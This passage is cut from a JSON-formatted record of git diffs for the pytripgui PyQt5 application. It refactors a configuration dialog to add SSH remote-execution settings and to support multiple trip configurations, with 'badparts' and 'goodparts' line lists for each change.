self.dedx_path,\n+            self._ui, \"Select DEDX\", self.dedx_path.text,\n             \"Stopping power table (*.dedx)\")\n         if selected_file[0] != \"\":\n             print(selected_file)\n-            self.dedx_path = selected_file[0]\n+            self.dedx_path.text = selected_file[0]\n \n-    def _disable_unimplemented(self):\n-        self.ui.tripAccess_comboBox.setDisabled(True)\n-        self.ui.remote_tab.setDisabled(True)\n-        self.ui.tab_test.setDisabled(True)\n+    def _browse_pkey_path(self):\n+        selected_file = QFileDialog.getOpenFileName(\n+            self._ui, \"Select private key for SSH connection\",\n+            self.pkey_path.text, \"Private key (*)\")\n+        if selected_file[0] != \"\":\n+            self.pkey_path.text = selected_file[0]\n+\n+    def _on_local_radio_button_click(self):\n+        self._ui.local_radioButton.setChecked(True)\n+        self._ui.tripPath_pushButton.setVisible(True)\n+        self._ui.hlut_pushButton.setVisible(True)\n+        self._ui.dedx_pushButton.setVisible(True)\n+        self._ui.ssh_GroupBox.setEnabled(False)\n+        self._ui.remoteLocal_groupBox.setTitle(\"Local paths\")\n+\n+    def _on_remote_radio_button_click(self):\n+        self._ui.remote_radioButton.setChecked(True)\n+        self._ui.tripPath_pushButton.setVisible(False)\n+        self._ui.hlut_pushButton.setVisible(False)\n+        self._ui.dedx_pushButton.setVisible(False)\n+        self._ui.ssh_GroupBox.setEnabled(True)\n+        self._ui.remoteLocal_groupBox.setTitle(\"Remote paths\")\n \n     def show(self):\n-        self.ui.show()\n-        self.ui.exec_()\n+        self._ui.show()\n+        self._ui.exec_()\n \n     def exit(self):\n-        self.ui.close()\n+        self._ui.close()\n \n     def set_ok_callback(self, fun):\n-        self.ui.accept_buttonBox.accepted.connect(fun)\n+        self._ui.accept_buttonBox.accepted.connect(fun)\n \n     def set_cancel_callback(self, fun):\n-        self.ui.accept_buttonBox.rejected.connect(fun)\n+        self._ui.accept_buttonBox.rejected.connect(fun)\n \n     @property\n-    def wdir_path(self):\n-        return self.ui.wdirPath_lineEdit.text()\n-\n-    @wdir_path.getter\n-    def wdir_path(self):\n-        return self.ui.wdirPath_lineEdit.text()\n-\n-    @wdir_path.setter\n-    def wdir_path(self, wdir_path):\n-        self.ui.wdirPath_lineEdit.setText(wdir_path)\n-\n-    @property\n-    def trip_path(self):\n-        return self.ui.tripPath_lineEdit.text()\n-\n-    @trip_path.getter\n-    def trip_path(self):\n-        return self.ui.tripPath_lineEdit.text()\n-\n-    @trip_path.setter\n-    def trip_path(self, trip_path):\n-        self.ui.tripPath_lineEdit.setText(trip_path)\n-\n-    @property\n-    def hlut_path(self):\n-        return self.ui.hlut_lineEdit.text()\n-\n-    @hlut_path.getter\n-    def hlut_path(self):\n-        return self.ui.hlut_lineEdit.text()\n-\n-    @hlut_path.setter\n-    def hlut_path(self, hlut_path):\n-        self.ui.hlut_lineEdit.setText(hlut_path)\n-\n-    @property\n-    def dedx_path(self):\n-        return self.ui.dedx_lineEdit.text()\n-\n-    @dedx_path.getter\n-    def dedx_path(self):\n-        return self.ui.dedx_lineEdit.text()\n-\n-    @dedx_path.setter\n-    def dedx_path(self, dedx_path):\n-        self.ui.dedx_lineEdit.setText(dedx_path)\n+    def remote_execution(self):\n+        return self._ui.remote_radioButton.isChecked()\n+\n+    @remote_execution.setter\n+    def remote_execution(self, remote_execution):\n+        if remote_execution:\n+            self._ui.remote_radioButton.clicked.emit()\n+        else:\n+            self._ui.local_radioButton.clicked.emit","add":85,"remove":77,"filename":"\/pytripgui\/config_vc\/config_view.py","badparts":["        self.ui = UiTripConfig()","        self._disable_unimplemented()","        self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)","        self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)","        self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)","        self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)","            self.ui,","            \"Select working directory\",","            self.wdir_path,","            self.wdir_path = selected_dir","            self.ui,","            \"Select trip executable directory\",","            self.trip_path,","            self.trip_path = selected_dir","            self.ui,","            \"Select HLUT\",","            self.hlut_path,","            self.hlut_path = selected_file[0]","            self.ui,","            \"Select DEDX\",","            self.dedx_path,","            self.dedx_path = selected_file[0]","    def _disable_unimplemented(self):","        self.ui.tripAccess_comboBox.setDisabled(True)","        self.ui.remote_tab.setDisabled(True)","        self.ui.tab_test.setDisabled(True)","        self.ui.show()","        self.ui.exec_()","        self.ui.close()","        self.ui.accept_buttonBox.accepted.connect(fun)","        self.ui.accept_buttonBox.rejected.connect(fun)","    def wdir_path(self):","        return self.ui.wdirPath_lineEdit.text()","    @wdir_path.getter","    def wdir_path(self):","        return self.ui.wdirPath_lineEdit.text()","    @wdir_path.setter","    def wdir_path(self, wdir_path):","        self.ui.wdirPath_lineEdit.setText(wdir_path)","    @property","    def trip_path(self):","        return self.ui.tripPath_lineEdit.text()","    @trip_path.getter","    def trip_path(self):","        return self.ui.tripPath_lineEdit.text()","    @trip_path.setter","    def trip_path(self, trip_path):","        self.ui.tripPath_lineEdit.setText(trip_path)","    @property","    def hlut_path(self):","        return self.ui.hlut_lineEdit.text()","    @hlut_path.getter","    def hlut_path(self):","        return self.ui.hlut_lineEdit.text()","    @hlut_path.setter","    def hlut_path(self, hlut_path):","        self.ui.hlut_lineEdit.setText(hlut_path)","    @property","    def dedx_path(self):","        return self.ui.dedx_lineEdit.text()","    @dedx_path.getter","    def dedx_path(self):","        return self.ui.dedx_lineEdit.text()","    @dedx_path.setter","    def dedx_path(self, dedx_path):","        self.ui.dedx_lineEdit.setText(dedx_path)"],"goodparts":["from pytripgui.view.qt_view_adapter import LineEdit, ComboBox, UserInfoBox, PushButton","    stackedWidget_local_index = 0","    stackedWidget_remote_index = 1","        self._ui = UiTripConfig()","        self.name = LineEdit(self._ui.configName_lineEdit)","        self.user_name = LineEdit(self._ui.username_lineEdit)","        self.pkey_path = LineEdit(self._ui.pkey_lineEdit)","        self.password = LineEdit(self._ui.password_lineEdit)","        self.host_name = LineEdit(self._ui.host_lineEdit)","        self.dedx_path = LineEdit(self._ui.dedx_lineEdit)","        self.hlut_path = LineEdit(self._ui.hlut_lineEdit)","        self.wdir_path = LineEdit(self._ui.wdirPath_lineEdit)","        self.trip_path = LineEdit(self._ui.tripPath_lineEdit)","        self.add_button = PushButton(self._ui.add_pushButton)","        self.remove_button = PushButton(self._ui.remove_pushButton)","        self.wdir_remote_path = LineEdit(self._ui.wdirRemote_lineEdit)","        self.configs = ComboBox(self._ui.configs_comboBox)","        self.info_box = UserInfoBox(self._ui)","        self._ui.local_radioButton.clicked.emit()","        self.name.emit_on_text_change(","            lambda text: self.configs.set_current_item_text(text))","    def test_ssh_clicked_callback_connect(self, callback):","        self._ui.testSsh_pushButton.clicked.connect(callback)","        self._ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)","        self._ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)","        self._ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)","        self._ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)","        self._ui.pKey_pushButton.clicked.connect(self._browse_pkey_path)","        self._ui.local_radioButton.clicked.connect(","            self._on_local_radio_button_click)","        self._ui.remote_radioButton.clicked.connect(","            self._on_remote_radio_button_click)","            self._ui, \"Select working directory\", self.wdir_path.text,","            self.wdir_path.text = selected_dir","            self._ui, \"Select trip executable directory\", self.trip_path.text,","            self.trip_path.text = selected_dir","            self._ui, \"Select HLUT\", self.hlut_path.text,","            self.hlut_path.text = selected_file[0]","            self._ui, \"Select DEDX\", self.dedx_path.text,","            self.dedx_path.text = selected_file[0]","    def _browse_pkey_path(self):","        selected_file = QFileDialog.getOpenFileName(","            self._ui, \"Select private key for SSH connection\",","            self.pkey_path.text, \"Private key (*)\")","        if selected_file[0] != \"\":","            self.pkey_path.text = selected_file[0]","    def _on_local_radio_button_click(self):","        self._ui.local_radioButton.setChecked(True)","        self._ui.tripPath_pushButton.setVisible(True)","        self._ui.hlut_pushButton.setVisible(True)","        self._ui.dedx_pushButton.setVisible(True)","        self._ui.ssh_GroupBox.setEnabled(False)","        self._ui.remoteLocal_groupBox.setTitle(\"Local paths\")","    def _on_remote_radio_button_click(self):","        self._ui.remote_radioButton.setChecked(True)","        self._ui.tripPath_pushButton.setVisible(False)","        self._ui.hlut_pushButton.setVisible(False)","        self._ui.dedx_pushButton.setVisible(False)","        self._ui.ssh_GroupBox.setEnabled(True)","        self._ui.remoteLocal_groupBox.setTitle(\"Remote paths\")","        self._ui.show()","        self._ui.exec_()","        self._ui.close()","        self._ui.accept_buttonBox.accepted.connect(fun)","        self._ui.accept_buttonBox.rejected.connect(fun)","    def remote_execution(self):","        return self._ui.remote_radioButton.isChecked()","    @remote_execution.setter","    def remote_execution(self, remote_execution):","        if remote_execution:","            self._ui.remote_radioButton.clicked.emit()","        else:","            self._ui.local_radioButton.clicked.emit"]},{"diff":"\n+from pytripgui.view.qt_view_adapter import LineEdit, ComboBox, UserInfoBox, PushButton\n from pytripgui.view.qt_gui import UiTripConfig\n from PyQt5.QtWidgets import QFileDialog\n \n import logging\n+\n logger = logging.getLogger(__name__)\n \n \n class ConfigQtView(object):\n+    stackedWidget_local_index = 0\n+    stackedWidget_remote_index = 1\n     \"\"\"\n     \"\"\"\n     def __init__(self):\n-        self.ui = UiTripConfig()\n+        self._ui = UiTripConfig()\n+\n+        self.name = LineEdit(self._ui.configName_lineEdit)\n+        self.user_name = LineEdit(self._ui.username_lineEdit)\n+        self.pkey_path = LineEdit(self._ui.pkey_lineEdit)\n+        self.password = LineEdit(self._ui.password_lineEdit)\n+        self.host_name = LineEdit(self._ui.host_lineEdit)\n+        self.dedx_path = LineEdit(self._ui.dedx_lineEdit)\n+        self.hlut_path = LineEdit(self._ui.hlut_lineEdit)\n+        self.wdir_path = LineEdit(self._ui.wdirPath_lineEdit)\n+        self.trip_path = LineEdit(self._ui.tripPath_lineEdit)\n+\n+        self.add_button = PushButton(self._ui.add_pushButton)\n+        self.remove_button = PushButton(self._ui.remove_pushButton)\n+\n+        self.wdir_remote_path = LineEdit(self._ui.wdirRemote_lineEdit)\n+\n+        self.configs = ComboBox(self._ui.configs_comboBox)\n+\n+        self.info_box = UserInfoBox(self._ui)\n \n         self._setup_internal_callbacks()\n-        self._disable_unimplemented()\n+        self._ui.local_radioButton.clicked.emit()\n+\n+        self.name.emit_on_text_change(\n+            lambda text: self.configs.set_current_item_text(text))\n+\n+    def test_ssh_clicked_callback_connect(self, callback):\n+        self._ui.testSsh_pushButton.clicked.connect(callback)\n \n     def _setup_internal_callbacks(self):\n-        self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n-        self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n-        self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n-        self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n+        self._ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n+        self._ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n+        self._ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n+        self._ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n+        self._ui.pKey_pushButton.clicked.connect(self._browse_pkey_path)\n+\n+        self._ui.local_radioButton.clicked.connect(\n+            self._on_local_radio_button_click)\n+        self._ui.remote_radioButton.clicked.connect(\n+            self._on_remote_radio_button_click)\n \n     def _browse_wdir(self):\n         selected_dir = QFileDialog.getExistingDirectory(\n-            self.ui,\n-            \"Select working directory\",\n-            self.wdir_path,\n+            self._ui, \"Select working directory\", self.wdir_path.text,\n             QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n         if selected_dir != \"\":\n-            self.wdir_path = selected_dir\n+            self.wdir_path.text = selected_dir\n \n     def _browse_trip_path(self):\n         selected_dir = QFileDialog.getExistingDirectory(\n-            self.ui,\n-            \"Select trip executable directory\",\n-            self.trip_path,\n+            self._ui, \"Select trip executable directory\", self.trip_path.text,\n             QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n         if selected_dir != \"\":\n-            self.trip_path = selected_dir\n+            self.trip_path.text = selected_dir\n \n     def _browse_hlut_path(self):\n         selected_file = QFileDialog.getOpenFileName(\n-            self.ui,\n-            \"Select HLUT\",\n-            self.hlut_path,\n+            self._ui, \"Select HLUT\", self.hlut_path.text,\n             \"Hounsfield lookup table (*.hlut)\")\n         if selected_file[0] != \"\":\n-            self.hlut_path = selected_file[0]\n+            self.hlut_path.text = selected_file[0]\n \n     def _browse_dedx_path(self):\n         selected_file = QFileDialog.getOpenFileName(\n-            self.ui,\n-            \"Select DEDX\",\n-            self.dedx_path,\n+            self._ui, \"Select DEDX\", self.dedx_path.text,\n             \"Stopping power table (*.dedx)\")\n         if selected_file[0] != \"\":\n             print(selected_file)\n-            self.dedx_path = selected_file[0]\n+            self.dedx_path.text = selected_file[0]\n \n-    def _disable_unimplemented(self):\n-        self.ui.tripAccess_comboBox.setDisabled(True)\n-        self.ui.remote_tab.setDisabled(True)\n-        self.ui.tab_test.setDisabled(True)\n+    def _browse_pkey_path(self):\n+        selected_file = QFileDialog.getOpenFileName(\n+            self._ui, \"Select private key for SSH connection\",\n+            self.pkey_path.text, \"Private key (*)\")\n+        if selected_file[0] != \"\":\n+            self.pkey_path.text = selected_file[0]\n+\n+    def _on_local_radio_button_click(self):\n+        self._ui.local_radioButton.setChecked(True)\n+        self._ui.tripPath_pushButton.setVisible(True)\n+        self._ui.hlut_pushButton.setVisible(True)\n+        self._ui.dedx_pushButton.setVisible(True)\n+        self._ui.ssh_GroupBox.setEnabled(False)\n+        self._ui.remoteLocal_groupBox.setTitle(\"Local paths\")\n+\n+    def _on_remote_radio_button_click(self):\n+        self._ui.remote_radioButton.setChecked(True)\n+        self._ui.tripPath_pushButton.setVisible(False)\n+        self._ui.hlut_pushButton.setVisible(False)\n+        self._ui.dedx_pushButton.setVisible(False)\n+        self._ui.ssh_GroupBox.setEnabled(True)\n+        self._ui.remoteLocal_groupBox.setTitle(\"Remote paths\")\n \n     def show(self):\n-        self.ui.show()\n-        self.ui.exec_()\n+        self._ui.show()\n+        self._ui.exec_()\n \n     def exit(self):\n-        self.ui.close()\n+        self._ui.close()\n \n     def set_ok_callback(self, fun):\n-        self.ui.accept_buttonBox.accepted.connect(fun)\n+        self._ui.accept_buttonBox.accepted.connect(fun)\n \n     def set_cancel_callback(self, fun):\n-        self.ui.accept_buttonBox.rejected.connect(fun)\n+        self._ui.accept_buttonBox.rejected.connect(fun)\n \n     @property\n-    def wdir_path(self):\n-        return self.ui.wdirPath_lineEdit.text()\n-\n-    @wdir_path.getter\n-    def wdir_path(self):\n-        return self.ui.wdirPath_lineEdit.text()\n-\n-    @wdir_path.setter\n-    def wdir_path(self, wdir_path):\n-        self.ui.wdirPath_lineEdit.setText(wdir_path)\n-\n-    @property\n-    def trip_path(self):\n-        return self.ui.tripPath_lineEdit.text()\n-\n-    @trip_path.getter\n-    def trip_path(self):\n-        return self.ui.tripPath_lineEdit.text()\n-\n-    @trip_path.setter\n-    def trip_path(self, trip_path):\n-        self.ui.tripPath_lineEdit.setText(trip_path)\n-\n-    @property\n-    def hlut_path(self):\n-        return self.ui.hlut_lineEdit.text()\n-\n-    @hlut_path.getter\n-    def hlut_path(self):\n-        return self.ui.hlut_lineEdit.text()\n-\n-    @hlut_path.setter\n-    def hlut_path(self, hlut_path):\n-        self.ui.hlut_lineEdit.setText(hlut_path)\n-\n-    @property\n-    def dedx_path(self):\n-        return self.ui.dedx_lineEdit.text()\n-\n-    @dedx_path.getter\n-    def dedx_path(self):\n-        return self.ui.dedx_lineEdit.text()\n-\n-    @dedx_path.setter\n-    def dedx_path(self, dedx_path):\n-        self.ui.dedx_lineEdit.setText(dedx_path)\n+    def remote_execution(self):\n+        return self._ui.remote_radioButton.isChecked()\n+\n+    @remote_execution.setter\n+    def remote_execution(self, remote_execution):\n+        if remote_execution:\n+            self._ui.remote_radioButton.clicked.emit()\n+        else:\n+            self._ui.local_radioButton.clicked.emit","add":85,"remove":77,"filename":"\/pytripgui\/config_vc\/config_view.py","badparts":["        self.ui = UiTripConfig()","        self._disable_unimplemented()","        self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)","        self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)","        self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)","        self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)","            self.ui,","            \"Select working directory\",","            self.wdir_path,","            self.wdir_path = selected_dir","            self.ui,","            \"Select trip executable directory\",","            self.trip_path,","            self.trip_path = selected_dir","            self.ui,","            \"Select HLUT\",","            self.hlut_path,","            self.hlut_path = selected_file[0]","            self.ui,","            \"Select DEDX\",","            self.dedx_path,","            self.dedx_path = selected_file[0]","    def _disable_unimplemented(self):","        self.ui.tripAccess_comboBox.setDisabled(True)","        self.ui.remote_tab.setDisabled(True)","        self.ui.tab_test.setDisabled(True)","        self.ui.show()","        self.ui.exec_()","        self.ui.close()","        self.ui.accept_buttonBox.accepted.connect(fun)","        self.ui.accept_buttonBox.rejected.connect(fun)","    def wdir_path(self):","        return self.ui.wdirPath_lineEdit.text()","    @wdir_path.getter","    def wdir_path(self):","        return self.ui.wdirPath_lineEdit.text()","    @wdir_path.setter","    def wdir_path(self, wdir_path):","        self.ui.wdirPath_lineEdit.setText(wdir_path)","    @property","    def trip_path(self):","        return self.ui.tripPath_lineEdit.text()","    @trip_path.getter","    def trip_path(self):","        return self.ui.tripPath_lineEdit.text()","    @trip_path.setter","    def trip_path(self, trip_path):","        self.ui.tripPath_lineEdit.setText(trip_path)","    @property","    def hlut_path(self):","        return self.ui.hlut_lineEdit.text()","    @hlut_path.getter","    def hlut_path(self):","        return self.ui.hlut_lineEdit.text()","    @hlut_path.setter","    def hlut_path(self, hlut_path):","        self.ui.hlut_lineEdit.setText(hlut_path)","    @property","    def dedx_path(self):","        return self.ui.dedx_lineEdit.text()","    @dedx_path.getter","    def dedx_path(self):","        return self.ui.dedx_lineEdit.text()","    @dedx_path.setter","    def dedx_path(self, dedx_path):","        self.ui.dedx_lineEdit.setText(dedx_path)"],"goodparts":["from pytripgui.view.qt_view_adapter import LineEdit, ComboBox, UserInfoBox, PushButton","    stackedWidget_local_index = 0","    stackedWidget_remote_index = 1","        self._ui = UiTripConfig()","        self.name = LineEdit(self._ui.configName_lineEdit)","        self.user_name = LineEdit(self._ui.username_lineEdit)","        self.pkey_path = LineEdit(self._ui.pkey_lineEdit)","        self.password = LineEdit(self._ui.password_lineEdit)","        self.host_name = LineEdit(self._ui.host_lineEdit)","        self.dedx_path = LineEdit(self._ui.dedx_lineEdit)","        self.hlut_path = LineEdit(self._ui.hlut_lineEdit)","        self.wdir_path = LineEdit(self._ui.wdirPath_lineEdit)","        self.trip_path = LineEdit(self._ui.tripPath_lineEdit)","        self.add_button = PushButton(self._ui.add_pushButton)","        self.remove_button = PushButton(self._ui.remove_pushButton)","        self.wdir_remote_path = LineEdit(self._ui.wdirRemote_lineEdit)","        self.configs = ComboBox(self._ui.configs_comboBox)","        self.info_box = UserInfoBox(self._ui)","        self._ui.local_radioButton.clicked.emit()","        self.name.emit_on_text_change(","            lambda text: self.configs.set_current_item_text(text))","    def test_ssh_clicked_callback_connect(self, callback):","        self._ui.testSsh_pushButton.clicked.connect(callback)","        self._ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)","        self._ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)","        self._ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)","        self._ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)","        self._ui.pKey_pushButton.clicked.connect(self._browse_pkey_path)","        self._ui.local_radioButton.clicked.connect(","            self._on_local_radio_button_click)","        self._ui.remote_radioButton.clicked.connect(","            self._on_remote_radio_button_click)","            self._ui, \"Select working directory\", self.wdir_path.text,","            self.wdir_path.text = selected_dir","            self._ui, \"Select trip executable directory\", self.trip_path.text,","            self.trip_path.text = selected_dir","            self._ui, \"Select HLUT\", self.hlut_path.text,","            self.hlut_path.text = selected_file[0]","            self._ui, \"Select DEDX\", self.dedx_path.text,","            self.dedx_path.text = selected_file[0]","    def _browse_pkey_path(self):","        selected_file = QFileDialog.getOpenFileName(","            self._ui, \"Select private key for SSH connection\",","            self.pkey_path.text, \"Private key (*)\")","        if selected_file[0] != \"\":","            self.pkey_path.text = selected_file[0]","    def _on_local_radio_button_click(self):","        self._ui.local_radioButton.setChecked(True)","        self._ui.tripPath_pushButton.setVisible(True)","        self._ui.hlut_pushButton.setVisible(True)","        self._ui.dedx_pushButton.setVisible(True)","        self._ui.ssh_GroupBox.setEnabled(False)","        self._ui.remoteLocal_groupBox.setTitle(\"Local paths\")","    def _on_remote_radio_button_click(self):","        self._ui.remote_radioButton.setChecked(True)","        self._ui.tripPath_pushButton.setVisible(False)","        self._ui.hlut_pushButton.setVisible(False)","        self._ui.dedx_pushButton.setVisible(False)","        self._ui.ssh_GroupBox.setEnabled(True)","        self._ui.remoteLocal_groupBox.setTitle(\"Remote paths\")","        self._ui.show()","        self._ui.exec_()","        self._ui.close()","        self._ui.accept_buttonBox.accepted.connect(fun)","        self._ui.accept_buttonBox.rejected.connect(fun)","    def remote_execution(self):","        return self._ui.remote_radioButton.isChecked()","    @remote_execution.setter","    def remote_execution(self, remote_execution):","        if remote_execution:","            self._ui.remote_radioButton.clicked.emit()","        else:","            self._ui.local_radioButton.clicked.emit"]}],"source":"\nfrom pytripgui.view.qt_gui import UiTripConfig from PyQt5.QtWidgets import QFileDialog import logging logger=logging.getLogger(__name__) class ConfigQtView(object): \"\"\" \"\"\" def __init__(self): self.ui=UiTripConfig() self._setup_internal_callbacks() self._disable_unimplemented() def _setup_internal_callbacks(self): self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir) self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path) self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path) self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path) def _browse_wdir(self): selected_dir=QFileDialog.getExistingDirectory( self.ui, \"Select working directory\", self.wdir_path, QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks) if selected_dir !=\"\": self.wdir_path=selected_dir def _browse_trip_path(self): selected_dir=QFileDialog.getExistingDirectory( self.ui, \"Select trip executable directory\", self.trip_path, QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks) if selected_dir !=\"\": self.trip_path=selected_dir def _browse_hlut_path(self): selected_file=QFileDialog.getOpenFileName( self.ui, \"Select HLUT\", self.hlut_path, \"Hounsfield lookup table(*.hlut)\") if selected_file[0] !=\"\": self.hlut_path=selected_file[0] def _browse_dedx_path(self): selected_file=QFileDialog.getOpenFileName( self.ui, \"Select DEDX\", self.dedx_path, \"Stopping power table(*.dedx)\") if selected_file[0] !=\"\": print(selected_file) self.dedx_path=selected_file[0] def _disable_unimplemented(self): self.ui.tripAccess_comboBox.setDisabled(True) self.ui.remote_tab.setDisabled(True) self.ui.tab_test.setDisabled(True) def show(self): self.ui.show() self.ui.exec_() def exit(self): self.ui.close() def set_ok_callback(self, fun): self.ui.accept_buttonBox.accepted.connect(fun) def set_cancel_callback(self, fun): self.ui.accept_buttonBox.rejected.connect(fun) @property def wdir_path(self): return self.ui.wdirPath_lineEdit.text() @wdir_path.getter def wdir_path(self): return self.ui.wdirPath_lineEdit.text() @wdir_path.setter def wdir_path(self, wdir_path): self.ui.wdirPath_lineEdit.setText(wdir_path) @property def trip_path(self): return self.ui.tripPath_lineEdit.text() @trip_path.getter def trip_path(self): return self.ui.tripPath_lineEdit.text() @trip_path.setter def trip_path(self, trip_path): self.ui.tripPath_lineEdit.setText(trip_path) @property def hlut_path(self): return self.ui.hlut_lineEdit.text() @hlut_path.getter def hlut_path(self): return self.ui.hlut_lineEdit.text() @hlut_path.setter def hlut_path(self, hlut_path): self.ui.hlut_lineEdit.setText(hlut_path) @property def dedx_path(self): return self.ui.dedx_lineEdit.text() @dedx_path.getter def dedx_path(self): return self.ui.dedx_lineEdit.text() @dedx_path.setter def dedx_path(self, dedx_path): self.ui.dedx_lineEdit.setText(dedx_path) ","sourceWithComments":"from pytripgui.view.qt_gui import UiTripConfig\nfrom PyQt5.QtWidgets import QFileDialog\n\nimport logging\nlogger = logging.getLogger(__name__)\n\n\nclass ConfigQtView(object):\n    \"\"\"\n    \"\"\"\n    def __init__(self):\n        self.ui = UiTripConfig()\n\n        self._setup_internal_callbacks()\n        self._disable_unimplemented()\n\n    def _setup_internal_callbacks(self):\n        self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n        self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n        self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n        self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n\n    def _browse_wdir(self):\n        selected_dir = QFileDialog.getExistingDirectory(\n            self.ui,\n            \"Select working directory\",\n            self.wdir_path,\n            QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n        if selected_dir != \"\":\n            self.wdir_path = selected_dir\n\n    def _browse_trip_path(self):\n        selected_dir = QFileDialog.getExistingDirectory(\n            self.ui,\n            \"Select trip executable directory\",\n            self.trip_path,\n            QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n        if selected_dir != \"\":\n            self.trip_path = selected_dir\n\n    def _browse_hlut_path(self):\n        selected_file = QFileDialog.getOpenFileName(\n            self.ui,\n            \"Select HLUT\",\n            self.hlut_path,\n            \"Hounsfield lookup table (*.hlut)\")\n        if selected_file[0] != \"\":\n            self.hlut_path = selected_file[0]\n\n    def _browse_dedx_path(self):\n        selected_file = QFileDialog.getOpenFileName(\n            self.ui,\n            \"Select DEDX\",\n            self.dedx_path,\n            \"Stopping power table (*.dedx)\")\n        if selected_file[0] != \"\":\n            print(selected_file)\n            self.dedx_path = selected_file[0]\n\n    def _disable_unimplemented(self):\n        self.ui.tripAccess_comboBox.setDisabled(True)\n        self.ui.remote_tab.setDisabled(True)\n        self.ui.tab_test.setDisabled(True)\n\n    def show(self):\n        self.ui.show()\n        self.ui.exec_()\n\n    def exit(self):\n        self.ui.close()\n\n    def set_ok_callback(self, fun):\n        self.ui.accept_buttonBox.accepted.connect(fun)\n\n    def set_cancel_callback(self, fun):\n        self.ui.accept_buttonBox.rejected.connect(fun)\n\n    @property\n    def wdir_path(self):\n        return self.ui.wdirPath_lineEdit.text()\n\n    @wdir_path.getter\n    def wdir_path(self):\n        return self.ui.wdirPath_lineEdit.text()\n\n    @wdir_path.setter\n    def wdir_path(self, wdir_path):\n        self.ui.wdirPath_lineEdit.setText(wdir_path)\n\n    @property\n    def trip_path(self):\n        return self.ui.tripPath_lineEdit.text()\n\n    @trip_path.getter\n    def trip_path(self):\n        return self.ui.tripPath_lineEdit.text()\n\n    @trip_path.setter\n    def trip_path(self, trip_path):\n        self.ui.tripPath_lineEdit.setText(trip_path)\n\n    @property\n    def hlut_path(self):\n        return self.ui.hlut_lineEdit.text()\n\n    @hlut_path.getter\n    def hlut_path(self):\n        return self.ui.hlut_lineEdit.text()\n\n    @hlut_path.setter\n    def hlut_path(self, hlut_path):\n        self.ui.hlut_lineEdit.setText(hlut_path)\n\n    @property\n    def dedx_path(self):\n        return self.ui.dedx_lineEdit.text()\n\n    @dedx_path.getter\n    def dedx_path(self):\n        return self.ui.dedx_lineEdit.text()\n\n    @dedx_path.setter\n    def dedx_path(self, dedx_path):\n        self.ui.dedx_lineEdit.setText(dedx_path)\n"},"\/pytripgui\/model\/main_model.py":{"changes":[{"diff":"\n         self._pytrip_version = _pytrip_version\n         self._pytripgui_version = _pytripgui_version\n \n-        self.trip_config = Trip98ConfigModel()\n+        self.trip_configs = []\n         self.kernels = []  # placeholder for KernelModels\n \n         self.viewcanvases = None\n         self.patient_tree = None\n-        self.settings = None\n-\n         self.settings = SettingsModel(self)\n \n \n","add":1,"remove":3,"filename":"\/pytripgui\/model\/main_model.py","badparts":["        self.trip_config = Trip98ConfigModel()","        self.settings = None"],"goodparts":["        self.trip_configs = []"]},{"diff":"\n             a) _version is written to disk, but imported into Model when loading\n             b) __internal_attribute__ are not passed between Model and SettingsModel\n         \"\"\"\n-        self.trip_config = model.trip_config\n+        self.trip_configs = model.trip_configs\n \n         self.kernels = model.kernel","add":1,"remove":1,"filename":"\/pytripgui\/model\/main_model.py","badparts":["        self.trip_config = model.trip_config"],"goodparts":["        self.trip_configs = model.trip_configs"]},{"diff":"\n         self._pytrip_version = _pytrip_version\n         self._pytripgui_version = _pytripgui_version\n \n-        self.trip_config = Trip98ConfigModel()\n+        self.trip_configs = []\n         self.kernels = []  # placeholder for KernelModels\n \n         self.viewcanvases = None\n         self.patient_tree = None\n-        self.settings = None\n-\n         self.settings = SettingsModel(self)\n \n \n","add":1,"remove":3,"filename":"\/pytripgui\/model\/main_model.py","badparts":["        self.trip_config = Trip98ConfigModel()","        self.settings = None"],"goodparts":["        self.trip_configs = []"]},{"diff":"\n             a) _version is written to disk, but imported into Model when loading\n             b) __internal_attribute__ are not passed between Model and SettingsModel\n         \"\"\"\n-        self.trip_config = model.trip_config\n+        self.trip_configs = model.trip_configs\n \n         self.kernels = model.kernel","add":1,"remove":1,"filename":"\/pytripgui\/model\/main_model.py","badparts":["        self.trip_config = model.trip_config"],"goodparts":["        self.trip_configs = model.trip_configs"]}],"source":"\nimport logging from pytripgui.plan_executor.trip_config import Trip98ConfigModel logger=logging.getLogger(__name__) class MainModel(object): def __init__(self): from pytrip import __version__ as _pytrip_version from pytripgui import __version__ as _pytripgui_version self._pytrip_version=_pytrip_version self._pytripgui_version=_pytripgui_version self.trip_config=Trip98ConfigModel() self.kernels=[] 